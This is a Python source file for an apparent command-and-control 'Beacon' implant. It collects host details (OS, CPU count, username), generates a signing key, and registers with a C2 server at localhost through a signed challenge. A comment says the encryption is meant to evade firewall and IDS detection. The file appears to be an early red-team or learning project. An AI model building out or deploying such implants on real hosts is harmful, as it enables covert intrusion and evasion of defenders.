import uuid
import os
import urllib3
import base64

# Encryption libraries to prevent Firewall and IDS Detection
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey


class Beacon:

    BASE_SERVER_URL = "http://127.0.0.1:4999"

    def __init__(self):
        self.generate_key_pairs()

        self.beacon_id = str(uuid.uuid4())
        self.description = "Hello, I am a Beacon."
        self.beacon_fingerprint = self.generate_beacon_fingerprint()


    def generate_beacon_fingerprint(self):
        os_info = os.uname()
        os_cpu_count = os.cpu_count()
        os_user = os.environ.get("USER") or os.environ.get("USERNAME")

        return {
            "beacon_id": self.beacon_id,
            "public_key": self.public_key_hex,
            "os_info": os_info,
            "os_cpu_count": os_cpu_count,
            "os_user": os_user,
        }

    def generate_key_pairs(self):
        self.private_key = Ed25519PrivateKey.generate()
        self.public_key = self.private_key.public_key()

        self.private_key_hex = self.private_key.private_bytes_raw().hex()
        self.public_key_hex = self.public_key.public_bytes_raw().hex()

    def register_beacon(self):
        initial_registration_request = urllib3.request(
            "POST",
            f"{self.BASE_SERVER_URL}/api/register/start",
            json=self.beacon_fingerprint,
        )

        if initial_registration_request.status != 200:
            print(initial_registration_request.data)
            return

        json_response = initial_registration_request.json()

        challenge_id = json_response["challenge_id"]
        challenge = json_response["challenge"]

        challenge_signature = base64.b64encode(
            self.private_key.sign(base64.b64decode(challenge))
        ).decode("utf-8")

        challenge_response = {
            "challenge_id": challenge_id,
            "challenge_signature": challenge_signature,
        }


        challenge_response_request = urllib3.request(
            "POST",
            f"{self.BASE_SERVER_URL}/api/register/verify-challenge-response",
            json=challenge_response,
        )

        if challenge_response_request.json()['verified']:
            print("Beacon registered successsfully.")
        else:
            print("Beacon registration failed.")


b1 = Beacon()
b1.register_beacon()
